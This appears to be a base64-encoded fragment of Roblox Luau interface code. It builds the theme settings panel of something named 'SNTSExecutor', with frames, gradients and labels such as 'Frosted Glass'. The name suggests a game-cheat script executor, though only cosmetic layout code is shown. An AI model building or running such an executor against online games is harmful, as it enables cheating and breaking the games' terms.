PSAxNzsKRzJMWyJhNyJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbImE3Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImE3Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiYTciXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiYTciXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJhNyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyJhNyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTg1LCAwLCA1MCk7CkcyTFsiYTciXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJhNyJdWyJUZXh0Il0gPSBbW0xpZ2h0IFRoZW1lXV07CkcyTFsiYTciXVsiTmFtZSJdID0gW1tUaGVtZU5hbWVdXTsKRzJMWyJhNyJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDQ2NzgsIDAsIDAuNSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMy5UaGVtZTMKRzJMWyJhOCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiYTUiXSk7CkcyTFsiYTgiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImE4Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbImE4Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxMzQsIDAsIDUwKTsKRzJMWyJhOCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNDkzMSwgMCwgMC4yMDA5MSwgMCk7CkcyTFsiYTgiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJhOCJdWyJOYW1lIl0gPSBbW1RoZW1lM11dOwpHMkxbImE4Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMy5UaGVtZTMuR3JhZGllbnQxCkcyTFsiYTkiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImE4Il0pOwpHMkxbImE5Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJhOSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJhOSJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMC41KTsKRzJMWyJhOSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJhOSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMjk0NzgsIDAsIDAuMzQsIDApOwpHMkxbImE5Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYTkiXVsiTmFtZSJdID0gW1tHcmFkaWVudDFdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUzLlRoZW1lMy5HcmFkaWVudDEuVUlDb3JuZXIKRzJMWyJhYSJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiYTkiXSk7CkcyTFsiYWEiXVsiQ29ybmVyUmFkaXVzIl0gPSBVRGltLm5ldygwLCAxMDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTMuVGhlbWUzLkdyYWRpZW50MS5VSVN0cm9rZQpHMkxbImFiIl0gPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgRzJMWyJhOSJdKTsKRzJMWyJhYiJdWyJUaGlja25lc3MiXSA9IDI7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMy5UaGVtZTMuR3JhZGllbnQyCkcyTFsiYWMiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImE4Il0pOwpHMkxbImFjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJhYyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJhYyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMC41KTsKRzJMWyJhYyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJhYyJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNjMwNiwgMCwgMC4zNCwgMCk7CkcyTFsiYWMiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJhYyJdWyJOYW1lIl0gPSBbW0dyYWRpZW50Ml1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTMuVGhlbWUzLkdyYWRpZW50Mi5VSUNvcm5lcgpHMkxbImFkIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJhYyJdKTsKRzJMWyJhZCJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDEwMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMy5UaGVtZTMuR3JhZGllbnQyLlVJU3Ryb2tlCkcyTFsiYWUiXSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBHMkxbImFjIl0pOwpHMkxbImFlIl1bIlRoaWNrbmVzcyJdID0gMjsKRzJMWyJhZSJdWyJDb2xvciJdID0gQ29sb3IzLmZyb21SR0IoMjAxLCAyMDEsIDIwMSk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lMy5UaGVtZTMuR3JhZGllbnQzCkcyTFsiYWYiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImE4Il0pOwpHMkxbImFmIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJhZiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJhZiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMC41KTsKRzJMWyJhZiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJhZiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuOTY2NDIsIDAsIDAuMzQsIDApOwpHMkxbImFmIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYWYiXVsiTmFtZSJdID0gW1tHcmFkaWVudDNdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWUzLlRoZW1lMy5HcmFkaWVudDMuVUlDb3JuZXIKRzJMWyJiMCJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiYWYiXSk7CkcyTFsiYjAiXVsiQ29ybmVyUmFkaXVzIl0gPSBVRGltLm5ldygwLCAxMDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTMuVGhlbWUzLkdyYWRpZW50My5VSVN0cm9rZQpHMkxbImIxIl0gPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgRzJMWyJhZiJdKTsKRzJMWyJiMSJdWyJUaGlja25lc3MiXSA9IDI7CkcyTFsiYjEiXVsiQ29sb3IiXSA9IENvbG9yMy5mcm9tUkdCKDIwMSwgMjAxLCAyMDEpOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTMuVGhlbWUzLkdyYWRpZW50My5VSUdyYWRpZW50CkcyTFsiYjIiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiYWYiXSk7CkcyTFsiYjIiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3e0NvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4wMDAsIENvbG9yMy5mcm9tUkdCKDE1MywgNzIsIDE5NikpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC40NzEsIENvbG9yMy5mcm9tUkdCKDEzNiwgNzEsIDIyMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDkxLCA3OSwgMjAzKSl9OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTMuVGhlbWUzLlVJR3JpZExheW91dApHMkxbImIzIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JpZExheW91dCIsIEcyTFsiYTgiXSk7CkcyTFsiYjMiXVsiSG9yaXpvbnRhbEFsaWdubWVudCJdID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyJiMyJdWyJDZWxsU2l6ZSJdID0gVURpbTIubmV3KDAsIDM1LCAwLCAzNSk7CkcyTFsiYjMiXVsiVmVydGljYWxBbGlnbm1lbnQiXSA9IEVudW0uVmVydGljYWxBbGlnbm1lbnQuQ2VudGVyOwpHMkxbImIzIl1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CkcyTFsiYjMiXVsiQ2VsbFBhZGRpbmciXSA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMCk7CkcyTFsiYjMiXVsiRmlsbERpcmVjdGlvbiJdID0gRW51bS5GaWxsRGlyZWN0aW9uLlZlcnRpY2FsOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTQKRzJMWyJiNCJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiODUiXSk7CkcyTFsiYjQiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImI0Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbImI0Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyOTAsIDAsIDcwKTsKRzJMWyJiNCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImI0Il1bIk5hbWUiXSA9IFtbVGhlbWU0XV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5VSUNvcm5lcgpHMkxbImI1Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJiNCJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5UaGVtZU5hbWUKRzJMWyJiNiJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbImI0Il0pOwpHMkxbImI2Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJiNiJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiYjYiXVsiVGV4dFhBbGlnbm1lbnQiXSA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKRzJMWyJiNiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJiNiJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbImI2Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImI2Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiYjYiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAsIDAuNSk7CkcyTFsiYjYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDE4NSwgMCwgNTApOwpHMkxbImI2Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYjYiXVsiVGV4dCJdID0gW1tGcm9zdGVkIEdsYXNzXV07CkcyTFsiYjYiXVsiTmFtZSJdID0gW1tUaGVtZU5hbWVdXTsKRzJMWyJiNiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDQ2NzgsIDAsIDAuNSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5UaGVtZTQKRzJMWyJiNyJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiYjQiXSk7CkcyTFsiYjciXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImI3Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbImI3Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxMzQsIDAsIDUwKTsKRzJMWyJiNyJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNDkzMSwgMCwgMC4yMDA5MSwgMCk7CkcyTFsiYjciXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJiNyJdWyJOYW1lIl0gPSBbW1RoZW1lNF1dOwpHMkxbImI3Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5UaGVtZTQuR3JhZGllbnQxCkcyTFsiYjgiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImI3Il0pOwpHMkxbImI4Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJiOCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJiOCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMC41KTsKRzJMWyJiOCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJiOCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMjk0NzgsIDAsIDAuMzQsIDApOwpHMkxbImI4Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYjgiXVsiTmFtZSJdID0gW1tHcmFkaWVudDFdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU0LlRoZW1lNC5HcmFkaWVudDEuVUlDb3JuZXIKRzJMWyJiOSJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiYjgiXSk7CkcyTFsiYjkiXVsiQ29ybmVyUmFkaXVzIl0gPSBVRGltLm5ldygwLCAxMDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTQuVGhlbWU0LkdyYWRpZW50MS5VSVN0cm9rZQpHMkxbImJhIl0gPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgRzJMWyJiOCJdKTsKRzJMWyJiYSJdWyJUaGlja25lc3MiXSA9IDI7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5UaGVtZTQuR3JhZGllbnQyCkcyTFsiYmIiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImI3Il0pOwpHMkxbImJiIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJiYiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJiYiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMC41KTsKRzJMWyJiYiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJiYiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNjMwNiwgMCwgMC4zNCwgMCk7CkcyTFsiYmIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJiYiJdWyJOYW1lIl0gPSBbW0dyYWRpZW50Ml1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTQuVGhlbWU0LkdyYWRpZW50Mi5VSUNvcm5lcgpHMkxbImJjIl0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJiYiJdKTsKRzJMWyJiYyJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDEwMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5UaGVtZTQuR3JhZGllbnQyLlVJU3Ryb2tlCkcyTFsiYmQiXSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBHMkxbImJiIl0pOwpHMkxbImJkIl1bIlRoaWNrbmVzcyJdID0gMjsKRzJMWyJiZCJdWyJDb2xvciJdID0gQ29sb3IzLmZyb21SR0IoMjAxLCAyMDEsIDIwMSk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNC5UaGVtZTQuR3JhZGllbnQzCkcyTFsiYmUiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImI3Il0pOwpHMkxbImJlIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJiZSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJiZSJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMSwgMC41KTsKRzJMWyJiZSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzUsIDAsIDM1KTsKRzJMWyJiZSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuOTY2NDIsIDAsIDAuMzQsIDApOwpHMkxbImJlIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYmUiXVsiTmFtZSJdID0gW1tHcmFkaWVudDNdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU0LlRoZW1lNC5HcmFkaWVudDMuVUlDb3JuZXIKRzJMWyJiZiJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiYmUiXSk7CkcyTFsiYmYiXVsiQ29ybmVyUmFkaXVzIl0gPSBVRGltLm5ldygwLCAxMDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTQuVGhlbWU0LkdyYWRpZW50My5VSVN0cm9rZQpHMkxbImMwIl0gPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgRzJMWyJiZSJdKTsKRzJMWyJjMCJdWyJUaGlja25lc3MiXSA9IDI7CkcyTFsiYzAiXVsiQ29sb3IiXSA9IENvbG9yMy5mcm9tUkdCKDIwMSwgMjAxLCAyMDEpOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTQuVGhlbWU0LkdyYWRpZW50My5VSUdyYWRpZW50CkcyTFsiYzEiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiYmUiXSk7CkcyTFsiYzEiXVsiQ29sb3IiXSA9IENvbG9yU2VxdWVuY2UubmV3e0NvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4wMDAsIENvbG9yMy5mcm9tUkdCKDE1MywgNzIsIDE5NikpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC40NzEsIENvbG9yMy5mcm9tUkdCKDEzNiwgNzEsIDIyMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDkxLCA3OSwgMjAzKSl9OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTQuVGhlbWU0LlVJR3JpZExheW91dApHMkxbImMyIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JpZExheW91dCIsIEcyTFsiYjciXSk7CkcyTFsiYzIiXVsiSG9yaXpvbnRhbEFsaWdubWVudCJdID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyJjMiJdWyJDZWxsU2l6ZSJdID0gVURpbTIubmV3KDAsIDM1LCAwLCAzNSk7CkcyTFsiYzIiXVsiVmVydGljYWxBbGlnbm1lbnQiXSA9IEVudW0uVmVydGljYWxBbGlnbm1lbnQuQ2VudGVyOwpHMkxbImMyIl1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CkcyTFsiYzIiXVsiQ2VsbFBhZGRpbmciXSA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMCk7CkcyTFsiYzIiXVsiRmlsbERpcmVjdGlvbiJdID0gRW51bS5GaWxsRGlyZWN0aW9uLlZlcnRpY2FsOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTUKRzJMWyJjMyJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiODUiXSk7CkcyTFsiYzMiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImMzIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpOwpHMkxbImMzIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyOTAsIDAsIDcwKTsKRzJMWyJjMyJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImMzIl1bIk5hbWUiXSA9IFtbVGhlbWU1XV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNS5VSUNvcm5lcgpHMkxbImM0Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJjMyJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNS5UaGVtZU5hbWUKRzJMWyJjNSJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbImMzIl0pOwpHMkxbImM1Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJjNSJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiYzUiXVsiVGV4dFhBbGlnbm1lbnQiXSA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKRzJMWyJjNSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJjNSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbImM1Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImM1Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiYzUiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAsIDAuNSk7CkcyTFsiYzUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDE4NSwgMCwgNTApOwpHMkxbImM1Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYzUiXVsiVGV4dCJdID0gW1tTb3JiZXRlc11dOwpHMkxbImM1Il1bIk5hbWUiXSA9IFtbVGhlbWVOYW1lXV07CkcyTFsiYzUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjA0Njc4LCAwLCAwLjUsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTUuVGhlbWU1CkcyTFsiYzYiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImMzIl0pOwpHMkxbImM2Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJjNiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KTsKRzJMWyJjNiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTM0LCAwLCA1MCk7CkcyTFsiYzYiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjQ5MzEsIDAsIDAuMjAwOTEsIDApOwpHMkxbImM2Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiYzYiXVsiTmFtZSJdID0gW1tUaGVtZTVdXTsKRzJMWyJjNiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTUuVGhlbWU1LkdyYWRpZW50MQpHMkxbImM3Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJjNiJdKTsKRzJMWyJjNyJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiYzciXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiYzciXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDEsIDAuNSk7C